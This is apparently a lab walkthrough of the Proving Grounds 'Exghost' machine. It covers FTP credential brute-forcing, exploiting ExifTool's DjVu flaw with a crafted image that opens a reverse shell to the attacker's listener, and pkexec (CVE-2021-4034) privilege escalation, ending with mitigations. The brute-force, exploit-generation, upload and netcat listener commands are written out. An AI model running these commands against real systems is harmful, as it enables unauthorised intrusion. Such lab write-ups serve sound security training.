# **Exghost | PG Practice**

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/9cad8129-e6fb-4117-8e8a-cd331b4d7611)

***

## **Reconnaissance**

Running an nmap scan the following ports where found


```
# Nmap 7.94SVN scan initiated Wed May 29 09:02:43 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.235.183
Nmap scan report for 192.168.235.183
Host is up (0.15s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
80/tcp open   http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: Host: 127.0.0.1; OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 29 09:05:07 2024 -- 1 IP address (1 host up) scanned in 144.47 seconds
```


Enumerating FTP I don't have access to login anonymously 



![](https://i.imgur.com/69qqsim.png)


Navigating to the website endpoint we have this 403 forbidden page


![](https://i.imgur.com/zQfRlXj.png)



I was able to fuzz for an `/uploads` directory but turns out to still be 403 Forbidden, all 403 bypass proof failed and i knew this was a dead end.


![](https://i.imgur.com/9BhAqgF.png)


However i felt like bruteforcing FTP might be a quick win for me sooo i decided to use the tool from GitHub which gave me a valid username and password



```bash
git clone https://github.com/rix4uni/FTPBruteForce.git
cd FTPBruteForce
go get -u github.com/jlaffaye/ftp
go run ftp-brute-force-default-credentails.go -ip 192.168.235.183:21
```



![](https://i.imgur.com/2mI2tOi.png)



Upon login in i found a backup file and downloaded it to my own machine


![](https://i.imgur.com/x947LFM.png)


Analyzing the backup file with wireshark and looking for captured HTTP packets i found an `exiftool` version



![](https://i.imgur.com/uJVYXnR.png)



Also found out i was able to upload files within an endpoint called `/exiftest.php`



![](https://i.imgur.com/3gcafFc.png)



Which turns out to be true while using the `curl` utility, The below command uploads a local file or send data that is typically submitted via web forms with the `-F` option and `-v` for verbosity.


Also take note of the parameter "`myFile`" as this was the variable given in the above screenshot


```
curl -F "myFile=@./LOCALFILE" http://192.168.235.183/exiftest.php -v
```


![](https://i.imgur.com/N0Jl768.png)



## **Foothold**



Using this [blog](https://www.exploit-db.com/exploits/50911) i was able to create a malicious `.jpeg` file due to Improper neutralization of user data in the `DjVu` file format in `ExifTool` versions 7.44 and up that allows arbitrary code execution when parsing the malicious image.


```
python3 exploit.py -s 192.168.45.219 4444
```


![](https://i.imgur.com/iGiNvWg.png)


Then uploaded it using `curl` and got a reverse shell with `netcat`


```bash
curl -F "myFile=@./image.jpg" http://192.168.180.183/exiftest.php -v

nc -lvnp 4444
```


![](https://i.imgur.com/onmclmB.png)



## **Privilege Escalation**



Running `linpeas.sh` on the machine i discovered few SUID binaries exploits, This was real pain as i had to go over each of them and see which was the quick win 🤦‍♀️


![](https://i.imgur.com/ML0n3DP.png)





Well, privilege escalation was done via the `pkexec` exploit popularly know as `CVE-2021-4034`


> Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).


You can get the python exploit from [here](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py) since most of the `C` exploits don't work 


![](https://i.imgur.com/Y4aZ2Ln.png)




## **Mitigations** 


- Change default credentials of the `FTP` server to strong, unique passwords and username.
- Replace `FTP` with a more secure protocol such as `SFTP` (Secure File Transfer Protocol) or FTPS (FTP Secure).
- Ensure `ExifTool` is updated to the latest version that includes the security patch, better still remove or restrict `ExifTool` Usage
- Update the `Polkit` package or Disable `pkexec` : `sudo chmod 0755 /usr/bin/pkexec`



Have fun xD


## **Status Check** ⚠️


I shouldn't be playing boxes 🤣, i have got exams next week but hell yeah, i really don't wanna be far away from doing this. However i might limit all of this in the coming months, Take of yourselves Fellas :)



![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/a2d7b812-fdd1-450d-8b9a-6690215a8b1c)



